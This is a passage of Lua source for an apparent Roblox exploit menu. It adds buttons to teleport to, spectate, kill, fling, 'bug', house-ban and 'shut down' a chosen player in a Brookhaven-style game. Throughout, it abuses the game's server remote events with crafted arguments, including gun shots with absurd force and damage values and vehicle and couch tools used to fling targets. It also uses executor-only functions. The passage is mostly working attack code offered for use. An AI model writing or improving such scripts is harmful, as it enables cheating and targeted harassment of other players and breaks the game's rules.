    seat2.CFrame.new(Vector3.new(0/0, 0/0, 0/0))
    couch.Parent = LocalPlayer.Character
    task.wait(0.1)
    couch.Parent = LocalPlayer.Backpack
    task.wait(2)
    local bv = seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")
    if bv then bv:Destroy() end
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
end


local killDropdown = Tab:AddDropdown({
    Name = "Select Player",
    Options = getPlayerList(),
    Default = "",
    Callback = function(value)
        selectedPlayerName = value
        getgenv().Target = value
    end
})

Tab:AddButton({
    Name = "Update Player List",
    Callback = function()
        local tablePlayers = Players:GetPlayers()
        local newPlayers = {}
        if killDropdown and #tablePlayers > 0 then
            for _, player in ipairs(tablePlayers) do
                if player.Name ~= LocalPlayer.Name then
                    table.insert(newPlayers, player.Name)
                end
            end
            killDropdown:Set(newPlayers)
            if selectedPlayerName and not Players:FindFirstChild(selectedPlayerName) then
                selectedPlayerName = nil
                getgenv().Target = nil
                killDropdown:SetValue("")
            end
        end
    end
})

Tab:AddButton({
    Name = "Teleport to Player",
    Callback = function()
        if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then
            return
        end
        local character = LocalPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then
            return
        end

        local targetPlayer = Players:FindFirstChild(selectedPlayerName)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        end
    end
})

Tab:AddToggle({
    Name = "Spectate Player",
    Default = false,
    Callback = function(value)
        local Camera = workspace.CurrentCamera

        local function UpdateCamera()
            if value then
                local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                if targetPlayer and targetPlayer.Character then
                    local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        Camera.CameraSubject = humanoid
                    end
                end
            else
                if LocalPlayer.Character then
                    local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        Camera.CameraSubject = humanoid
                    end
                end
            end
        end

        if value then
            if not getgenv().CameraConnection then
                getgenv().CameraConnection = RunService.Heartbeat:Connect(UpdateCamera)
            end
        else
            if getgenv().CameraConnection then
                getgenv().CameraConnection:Disconnect()
                getgenv().CameraConnection = nil
            end
            UpdateCamera()
        end
    end
})

Tab:AddSection({ "Headsit Player" })

Tab:AddTextBox({
    Name = "Player Name",
    Description = "Enter Name",
    PlaceholderText = "Ex: shad0ws",
    Callback = function(Value)
        local Players = game:GetService("Players")
        local StarterGui = game:GetService("StarterGui")
        local localPlayer = Players.LocalPlayer
        
        local function findPlayerByPartialName(partial)
            partial = partial:lower()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer and player.Name:lower():sub(1, #partial) == partial then
                    return player
                end
            end
            return nil
        end
        
        local function notifyPlayerSelected(player)
            local thumbType = Enum.ThumbnailType.HeadShot
            local thumbSize = Enum.ThumbnailSize.Size100x100
            local content, _ = Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)

            StarterGui:SetCore("SendNotification", {
                Title = "Player Selected",
                Text = player.Name .. " has been selected!",
                Icon = content,
                Duration = 5
            })
        end
        
        local foundPlayer = findPlayerByPartialName(Value)
        if foundPlayer then
            _G.selectedPlayerName = foundPlayer.Name
            notifyPlayerSelected(foundPlayer)
        end
    end
})

Tab:AddButton({
    Name = "Headsit Click to Toggle",
    Description = "Enable or disable headsit on selected player",
    Callback = function()
        local Players = game:GetService("Players")
        local localPlayer = Players.LocalPlayer
        
        if not _G.selectedPlayerName then
            return
        end
        
        if _G.headsitActive == nil then
            _G.headsitActive = false
        end
        
        local function headsitOnPlayer(targetPlayer)
            local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")

            if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("Head") then
                return false
            end
            local targetHead = targetPlayer.Character.Head
            local localRoot = character:FindFirstChild("HumanoidRootPart")
            if not localRoot then
                return false
            end

            localRoot.CFrame = targetHead.CFrame * CFrame.new(0, 2.2, 0)

            for _, v in pairs(localRoot:GetChildren()) do
                if v:IsA("WeldConstraint") then
                    v:Destroy()
                end
            end

            local weld = Instance.new("WeldConstraint")
            weld.Part0 = localRoot
            weld.Part1 = targetHead
            weld.Parent = localRoot

            if humanoid then
                humanoid.Sit = true
            end

            return true
        end

        local function removeHeadsit()
            local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            local localRoot = character:FindFirstChild("HumanoidRootPart")
            if localRoot then
                for _, v in pairs(localRoot:GetChildren()) do
                    if v:IsA("WeldConstraint") then
                        v:Destroy()
                    end
                end
            end
            if humanoid then
                humanoid.Sit = false
            end
        end

        if not _G.headsitActive then
            local target = Players:FindFirstChild(_G.selectedPlayerName)
            if target and headsitOnPlayer(target) then
                _G.headsitActive = true
            end
        else
            removeHeadsit()
            _G.headsitActive = false
        end
    end
})

Tab:AddSection({"Annoy & Glitch - Enable and disable when target is in void"})

Tab:AddToggle({
    Name = "Annoy",
    Default = false,
    Callback = function(state)
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RunService = game:GetService("RunService")
        local LocalPlayer = Players.LocalPlayer

        local Remote = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Gu1n")

        getgenv().BugActive = state
        
        local function startBug()
            if getgenv().BugConnection then
                getgenv().BugConnection:Disconnect()
                getgenv().BugConnection = nil
            end

            getgenv().BugConnection = RunService.Stepped:Connect(function()
                if not getgenv().BugActive then return end
                local targetName = getgenv().Target or selectedPlayerName
                local target = targetName and Players:FindFirstChild(targetName)
                local hrp = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local crazyVector = Vector3.new(
                        math.random(-2e9, 2e9),
                        math.random(-2e9, 2e9),
                        math.random(-2e9, 2e9)
                    )
                    local args = {
                        hrp, hrp, crazyVector, hrp.Position,
                        LocalPlayer.Backpack:FindFirstChild("Assault") and LocalPlayer.Backpack.Assault.GunScript_Local:FindFirstChild("MuzzleEffect"),
                        LocalPlayer.Backpack:FindFirstChild("Assault") and LocalPlayer.Backpack.Assault.GunScript_Local:FindFirstChild("HitEffect"),
                        1000000000, 1000000000, {false},
                        {1000000000, Vector3.new(30000000,30000000,30000000), BrickColor.new(29), 0.05, Enum.Material.SmoothPlastic, 0.05},
                        true, false
                    }
                    Remote:FireServer(unpack(args))
                end
            end)
        end
        
        if state then
            local tgt = getgenv().Target or selectedPlayerName
            if not tgt or not Players:FindFirstChild(tgt) then
                getgenv().BugActive = false
                return
            end
            startBug()
        else
            if getgenv().BugConnection then
                getgenv().BugConnection:Disconnect()
                getgenv().BugConnection = nil
            end
        end
    end
})


local MethodSection = Tab:AddSection({ Name = "Kill & Car" })

local killSpeed = 35

Tab:AddDropdown({
    Name = "Select Kill Method",
    Options = {"Bus", "Couch", "Couch Without Going to Target [BETA]"},
    Default = "",
    Callback = function(value)
        methodKill = value
    end
})

Tab:AddSlider({
    Name = "Kill Speed",
    Min = 10,
    Max = 100,
    Default = 35,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 5,
    ValueName = "Speed",
    Callback = function(value)
        killSpeed = value
    end
})

Tab:AddButton({
    Name = "Kill Player",
    Callback = function()
        if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then
            return
        end
        if methodKill == "Couch" then
            KillPlayerCouch()
        elseif methodKill == "Couch Without Going to Target [BETA]" then
            KillWithCouch()
        else
            local character = LocalPlayer.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then
                return
            end

            local originalPosition = humanoidRootPart.CFrame

            local function GetBus()
                local vehicles = game.Workspace:FindFirstChild("Vehicles")
                if vehicles then
                    return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
                end
                return nil
            end

            local bus = GetBus()

            if not bus then
                humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
                if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
                    remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
                end
                task.wait(1)
                bus = GetBus()
            end

            if bus then
                local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
                if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then
                    repeat
                        humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
                        task.wait()
                    until character.Humanoid.Sit or not bus.Parent
                    if character.Humanoid.Sit or not bus.Parent then
                        for k, v in pairs(bus.Body:GetChildren()) do
                            if v:IsA("Seat") then
                                v.CanTouch = false
                            end
                        end
                    end
                end
            end

            local function TrackPlayer()
                while true do
                    if selectedPlayerName then
                        local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                            if targetHumanoid and targetHumanoid.Sit then
                                if character.Humanoid then
                                    bus:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, -450, 9999)))
                                    task.wait(0.2)

                                    local function simulateJump()
                                        local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
                                        if humanoid then
                                            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                        end
                                    end

                                    simulateJump()
                                    task.wait(0.5)
                                    humanoidRootPart.CFrame = originalPosition
                                end
                                break
                            else
                                local targetRoot = targetPlayer.Character.HumanoidRootPart
                                local time = tick() * killSpeed
                                local lateralOffset = math.sin(time) * 4
                                local frontBackOffset = math.cos(time) * 20
                                bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))
                            end
                        end
                    end
                    RunService.RenderStepped:Wait()
                end
            end

            spawn(TrackPlayer)
        end
    end
})

Tab:AddButton({
    Name = "Bring Player",
    Callback = function()
        if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then
            return
        end
        if methodKill == "Couch" then
            BringPlayerLLL()
        elseif methodKill == "Couch Without Going to Target [BETA]" then
            BringWithCouch()
        else
            local character = LocalPlayer.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then
                return
            end

            local originalPosition = humanoidRootPart.CFrame

            local function GetBus()
                local vehicles = game.Workspace:FindFirstChild("Vehicles")
                if vehicles then
                    return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
                end
                return nil
            end

            local bus = GetBus()

            if not bus then
                humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
                if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
                    remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
                end
                task.wait(1)
                bus = GetBus()
            end

            if bus then
                local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
                if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then
                    repeat
                        humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
                        task.wait()
                    until character.Humanoid.Sit or not bus.Parent
                end
            end

            local function TrackPlayer()
                while true do
                    if selectedPlayerName then
                        local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                            if targetHumanoid and targetHumanoid.Sit then
                                if character.Humanoid then
                                    bus:SetPrimaryPartCFrame(originalPosition)
                                    task.wait(0.7)
                                    local args = { [1] = "DeleteAllVehicles" }
                                    ReplicatedStorage.RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                                end
                                break
                            else
                                local targetRoot = targetPlayer.Character.HumanoidRootPart
                                local time = tick() * killSpeed
                                local lateralOffset = math.sin(time) * 4
                                local frontBackOffset = math.cos(time) * 20
                                bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))
                            end
                        end
                    end
                    RunService.RenderStepped:Wait()
                end
            end

            spawn(TrackPlayer)
        end
    end
})

Tab:AddButton({
    Name = "Shutdown Player",
    Callback = function()
        playerCorrupt()
    end
})


local function houseBanKill()
    if not selectedPlayerName then
        return
    end

    local Player = game.Players.LocalPlayer
    local Backpack = Player.Backpack
    local Character = Player.Character
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Character:FindFirstChild("HumanoidRootPart")
    local Houses = game.Workspace:FindFirstChild("001_Lots")
    local OldPos = RootPart.CFrame
    local Angles = 0
    local Vehicles = Workspace.Vehicles
    local Pos

    function Check()
        if Player and Character and Humanoid and RootPart and Vehicles then
            return true
        else
            return false
        end
    end

    local selectedPlayer = game.Players:FindFirstChild(selectedPlayerName)
    if selectedPlayer and selectedPlayer.Character then
        if Check() then
            local House = Houses:FindFirstChild(Player.Name .. "House")
            if not House then
                local EHouse
                local availableHouses = {}
                
                for _, Lot in pairs(Houses:GetChildren()) do
                    if Lot.Name == "For Sale" then
                        for _, num in pairs(Lot:GetDescendants()) do
                            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                                table.insert(availableHouses, {Lot = Lot, Number = num.Value})
                                break
                            end
                        end
                    end
                end

                if #availableHouses > 0 then
                    local randomHouse = availableHouses[math.random(1, #availableHouses)]
                    EHouse = randomHouse.Lot
                    local houseNumber = randomHouse.Number

                    local BuyDetector = EHouse:FindFirstChild("BuyHouse")
                    Pos = BuyDetector.Position
                    if BuyDetector and BuyDetector:IsA("BasePart") then
                        RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0, -6, 0)
                        task.wait(0.5)
                        local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                        if ClickDetector then
                            fireclickdetector(ClickDetector)
                        end
                    end

                    task.wait(0.5)
                    local args = {
                        houseNumber,
                        "056_House"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):FireServer(unpack(args))
                else
                    return
                end
            end

            task.wait(0.5)
            local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
            if PreHouse then
                task.wait(0.5)
                local Number
                for i, x in pairs(PreHouse:GetDescendants()) do
                    if x.Name == "Number" and x:IsA("NumberValue") then
                        Number = x
                    end
                end
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", Number.Value)
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                if Check() then
                    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                    task.wait(0.5)
                    local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
                    task.wait(0.5)
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat
                            task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if PCar then
                if not Humanoid.Sit then
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat
                            task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end

                local Target = selectedPlayer
                local TargetC = Target.Character
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetC and TargetH and TargetRP then
                    if not TargetH.Sit then
                        while not TargetH.Sit do
                            task.wait()
                            local Fling = function(alvo, pos, angulo)
                                PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                            end
                            Angles = Angles + 100
                            Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(2.25, 1.5, -2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                        end
                        task.wait(0.2)
                        local House = Houses:FindFirstChild(Player.Name .. "House")
                        PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))
                        task.wait(0.2)
                        local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30, 30, 30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30, 30, 30))
                        local a = workspace:FindPartsInRegion3(pedro, game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)
                        for i, v in pairs(a) do
                            if v.Name == "HumanoidRootPart" then
                                local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)
                                local args = {
                                    [1] = "BanPlayerFromHouse",
                                    [2] = b,
                                    [3] = v.Parent
                                }
                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
                                local args = {
                                    [1] = "DeleteAllVehicles"
                                }
                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
        end
    end
end

Tab:AddButton({
    Name = "House Ban Kill",
    Callback = houseBanKill
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local cam = workspace.CurrentCamera
local currentPlayers, selectedPlayer = {}, nil
local viewing = false
local flingActive = false

Tab:AddToggle({
    Name = "Auto Fling ",
    Default = false,
    Callback = function(state)
        flingActive = state
        if state and selectedPlayerName then
            local target = Players:FindFirstChild(selectedPlayerName)
            if not target or not target.Character then return end
            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            if not root or not tRoot then return end
            local char = LocalPlayer.Character
            local hum = char:FindFirstChildOfClass("Humanoid")
            local original = root.CFrame

            local args = {
                "ClearAllTools"
            }
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))

            task.wait(0.2)

            local args = {
                [1] = "PickingTools",
                [2] = "Couch"
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

            task.wait(0.3)
            local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
            if tool then
                tool.Parent = char
            end
            task.wait(0.2)
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
            task.wait(0.25)

            workspace.FallenPartsDestroyHeight = 0/0
            local bv = Instance.new("BodyVelocity")
            bv.Name = "FlingForce"
            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
            bv.MaxForce = Vector3.new(1/0, 1/0, 1/0)
            bv.Parent = root
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            hum.PlatformStand = false
            cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum

            task.spawn(function()
                local angle = 0
                local parts = {root}
                while flingActive and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
                    local tHum = target.Character:FindFirstChildOfClass("Humanoid")
                    if tHum.Sit then break end
                    angle += 50

                    for _, part in ipairs(parts) do
                        local pos_x = target.Character.HumanoidRootPart.Position.X
                        local pos_y = target.Character.HumanoidRootPart.Position.Y
                        local pos_z = target.Character.HumanoidRootPart.Position.Z
                        pos_x = pos_x + (target.Character.HumanoidRootPart.Velocity.X / 1.5)
                        pos_y = pos_y + (target.Character.HumanoidRootPart.Velocity.Y / 1.5)
                        pos_z = pos_z + (target.Character.HumanoidRootPart.Velocity.Z / 1.5)
                        root.CFrame = CFrame.new(pos_x, pos_y, pos_z) * CFrame.Angles(math.rad(angle), 0, 0)
                    end

                    root.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    root.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    task.wait()
                end
                flingActive = false
                bv:Destroy()
                hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                hum.PlatformStand = false
                root.CFrame = original
                cam.CameraSubject = hum
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then
                        p.Velocity = Vector3.zero
                        p.RotVelocity = Vector3.zero
                    end
                end
                hum:UnequipTools()
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
            end)
        end
    end
})

local function FlingBall(target)
    local players = game:GetService("Players")
    local player = players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local hrp = character:WaitForChild("HumanoidRootPart")
    local backpack = player:WaitForChild("Backpack")
    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

    local function GetBall()
        if not backpack:FindFirstChild("SoccerBall") then
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
        end
        repeat task.wait() until backpack:FindFirstChild("SoccerBall")
        backpack.SoccerBall.Parent = character
        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)
        character.SoccerBall.Parent = backpack
        return ServerBalls:FindFirstChild("Soccer" .. player.Name)
    end

    local Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()
    Ball.CanCollide = false
    Ball.Massless = true
    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

    if target ~= player then
        local tchar = target.Character
        if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then
            local troot = tchar.HumanoidRootPart
            local thum = tchar.Humanoid

            if Ball:FindFirstChildWhichIsA("BodyVelocity") then
                Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()
            end

            local bv = Instance.new("BodyVelocity")
            bv.Name = "FlingPower"
            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.P = 9e900
            bv.Parent = Ball

            workspace.CurrentCamera.CameraSubject = thum
            local StartTime = os.time()
            repeat
                if troot.Velocity.Magnitude > 0 then
                    local pos_x = troot.Position.X + (troot.Velocity.X / 1.5)
                    local pos_y = troot.Position.Y + (troot.Velocity.Y / 1.5)
                    local pos_z = troot.Position.Z + (troot.Velocity.Z / 1.5)

                    local position = Vector3.new(pos_x, pos_y, pos_z)
                    Ball.CFrame = CFrame.new(position)
                    Ball.Orientation += Vector3.new(45, 60, 30)
                else
                    for i, v in pairs(tchar:GetChildren()) do
                        if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
                            Ball.CFrame = v.CFrame
                            task.wait(1/6000)
                        end
                    end
                end
                task.wait(1/6000)
            until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(workspace) or target.Parent ~= players
            workspace.CurrentCamera.CameraSubject = humanoid
        end
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local RE = ReplicatedStorage:WaitForChild("RE")
local ClearEvent = RE:FindFirstChild("1Clea1rTool1s")
local ToolEvent = RE:FindFirstChild("1Too1l")
local FireEvent = RE:FindFirstChild("1Gu1n")

local FlingSystem = { power = 1e16, damage = 9999999999999999999999999999998, interval = 0.02 }

local function clearTools()
    if ClearEvent then
        ClearEvent:FireServer("ClearAllTools")
    end
end

local function requestAssault()
    if ToolEvent then
        ToolEvent:InvokeServer("PickingTools", "Assault")
    end
end

local function hasWeapon()
    return LocalPlayer.Backpack:FindFirstChild("Assault") or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Assault"))
end

local function equipWeapon()
    local weapon = LocalPlayer.Backpack:FindFirstChild("Assault")
    if weapon and LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid:EquipTool(weapon)
            return true
        end
    end
    return false
end

local function getGunScript()
    if LocalPlayer.Character then
        local weapon = LocalPlayer.Character:FindFirstChild("Assault") or LocalPlayer.Backpack:FindFirstChild("Assault")
        if weapon then
            return weapon:FindFirstChild("GunScript_Local")
        end
    end
    return nil
end

local function executeShot(targetPart)
    local gunScript = getGunScript()
    if not gunScript or not targetPart or not FireEvent then return end

    local muzzle = gunScript:FindFirstChild("MuzzleEffect")
    local hit = gunScript:FindFirstChild("HitEffect")
    if not muzzle or not hit then return end

    local args = {
        targetPart,
        targetPart,
        Vector3.new(FlingSystem.power, FlingSystem.power, FlingSystem.power),
        targetPart.Position,
        muzzle,
        hit,
        0,
        0,
        { false },
        {
            FlingSystem.damage,
            Vector3.new(5000, 5000, 5000),
            BrickColor.new(29),
            0.25,
            Enum.Material.SmoothPlastic,
            0.25
        },
        true,
        false
    }

    FireEvent:FireServer(unpack(args))
end

local function getSelectedTarget()
    if not selectedPlayerName then return nil end
    local player = Players:FindFirstChild(selectedPlayerName)
    if player and player.Character then
        local humanoid = player.Character:FindFirstChild("Humanoid")
        local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if humanoid and humanoid.Health > 0 and rootPart then
            return { player = player, part = rootPart }
        end
    end
    return nil
end

local function flingTarget()
    local target = getSelectedTarget()
    if not target then return end

    executeShot(target.part)

    local char = target.player.Character
    if not char then return end

    local head = char:FindFirstChild("Head")
    if head then executeShot(head) end

    local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
    if torso then executeShot(torso) end
end

local function maintainWeapon()
    if not hasWeapon() then
        clearTools()
        task.wait(0.1)
        requestAssault()
        task.wait(0.2)

        local attempts = 0
        while not hasWeapon() and attempts < 20 do
            task.wait(0.1)
            attempts = attempts + 1
        end

        if hasWeapon() then
            equipWeapon()
        end
    end
end

function Stephannythrow()
    getgenv().StopStephanny = false
    maintainWeapon()
    task.spawn(function()
        while not getgenv().StopStephanny do
            maintainWeapon()
            if hasWeapon() and getGunScript() then
                pcall(flingTarget)
            end
            task.wait(FlingSystem.interval)
        end
    end)
end

Tab:AddButton({
  Name = "Bug Player",
  Description = "Bug Player Select.",
  Callback = function()
      Stephannythrow()
  end
})

Tab:AddButton({
  Name = "Stop Bug",
  Description = "Stop Player Bug",
  Callback = function()
      getgenv().StopStephanny = true
  end
})

Tab:AddButton({
    Name = "Fling Ball Select Player",
    Callback = function()
        FlingBall(game:GetService("Players")[selectedPlayerName])
    end
})


local Players = game:GetService('Players')
local lplayer = Players.LocalPlayer

local function isItemInInventory(itemName)
    for _, item in pairs(lplayer.Backpack:GetChildren()) do
        if item.Name == itemName then
            return true
        end
    end
    return false
end

local function equipItem(itemName)
    local item = lplayer.Backpack:FindFirstChild(itemName)
    if item then
        lplayer.Character.Humanoid:EquipTool(item)
    end
end

local function unequipItem(itemName)
    local item = lplayer.Character:FindFirstChild(itemName)
    if item then
        item.Parent = lplayer.Backpack
    end
end

local function ActiveAutoFling(targetPlayer)
    if not isItemInInventory("Couch") then
        local args = { [1] = "PickingTools", [2] = "Couch" }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
    end

    equipItem("Couch")
    getgenv().flingloop = true

    while getgenv().flingloop do
        local function flingloopfix()
            local Players = game:GetService("Players")
            local Player = Players.LocalPlayer
            local AllBool = false

            local SkidFling = function(TargetPlayer)
                local Character = Player.Character
                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
                local RootPart = Humanoid and Humanoid.RootPart
                local TCharacter = TargetPlayer.Character
                local THumanoid, TRootPart, THead, Accessory, Handle

                if TCharacter:FindFirstChildOfClass("Humanoid") then
                    THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
                end
                if THumanoid and THumanoid.RootPart then
                    TRootPart = THumanoid.RootPart
                end
                if TCharacter:FindFirstChild("Head") then
                    THead = TCharacter.Head
                end
                if TCharacter:FindFirstChildOfClass("Accessory") then
                    Accessory = TCharacter:FindFirstChildOfClass("Accessory")
                end
                if Accessory and Accessory:FindFirstChild("Handle") then
                    Handle = Accessory.Handle
                end

                if Character and Humanoid and RootPart then
                    if RootPart.Velocity.Magnitude < 50 then
                        getgenv().OldPos = RootPart.CFrame
                    end
                    if THumanoid and THumanoid.Sit and not AllBool then
                        unequipItem("Couch")
                        getgenv().flingloop = false
                        return
                    end
                    if THead then
                        workspace.CurrentCamera.CameraSubject = THead
                    elseif not THead and Handle then
